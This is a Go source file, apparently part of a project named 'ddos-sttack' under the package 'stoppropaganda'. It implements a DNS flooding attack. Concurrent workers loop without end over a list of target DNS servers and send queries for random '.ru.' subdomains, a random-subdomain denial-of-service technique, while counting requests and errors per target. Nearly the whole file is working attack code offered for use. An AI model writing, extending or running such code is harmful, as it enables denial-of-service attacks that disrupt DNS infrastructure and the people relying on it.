package stoppropaganda

import (
	"strings"
	"sync"

	"github.com/km8oz/ddos-sttack/internal/customprng"
	"github.com/km8oz/ddos-sttack/internal/targets"
	"github.com/miekg/dns"
)

type DNSTargetStatus struct {
	Requests     uint   `json:"requests"`
	Success      uint   `json:"success"`
	Errors       uint   `json:"errors"`
	LastErrorMsg string `json:"last_error_msg"`
}

type DNSTarget struct {
	Status DNSTargetStatus
	mux    sync.Mutex
	target string
}

var dnsClient *dns.Client

var dnsTargets = map[string]*DNSTarget{}

func startDNS() {
	for targetDNSServer := range targets.TargetDNSServers {
		dnsTargets[targetDNSServer] = &DNSTarget{
			target: targetDNSServer,
		}
	}

	dnsChannel := make(chan *DNSTarget, *flagDNSWorkers)

	// Spawn workers
	for i := 0; i < *flagDNSWorkers; i++ {
		go runDNSWorker(dnsChannel)
	}

	// Issue tasks
	go func() {
		for {
			for _, dns := range dnsTargets {
				dnsChannel <- dns
			}
		}
	}()
}

func runDNSWorker(c chan *DNSTarget) {
	rng := customprng.New(19) // max chars (15) + ".ru." (4) = 24
	message := new(dns.Msg)
	for {
		dnsTarget := <-c
		randomDomain := rng.StringSuffix(3, 15, ".ru.")
		message.SetQuestion(randomDomain, dns.TypeA)
		_, _, err := dnsClient.Exchange(message, dnsTarget.target)

		dnsTarget.mux.Lock()
		dnsTarget.Status.Requests++
		if err != nil {
			dnsTarget.Status.Errors++
			switch {
			case strings.HasSuffix(err.Error(), "no such host"):
				dnsTarget.Status.LastErrorMsg = "Host does not exist"
			case strings.HasSuffix(err.Error(), "connection refused"):
				dnsTarget.Status.LastErrorMsg = "Connection refused"
			case strings.HasSuffix(err.Error(), "i/o timeout"):
				dnsTarget.Status.LastErrorMsg = "Query timeout"
			default:
				dnsTarget.Status.LastErrorMsg = err.Error()
			}
		} else {
			dnsTarget.Status.Success++
		}
		dnsTarget.mux.Unlock()
	}
}
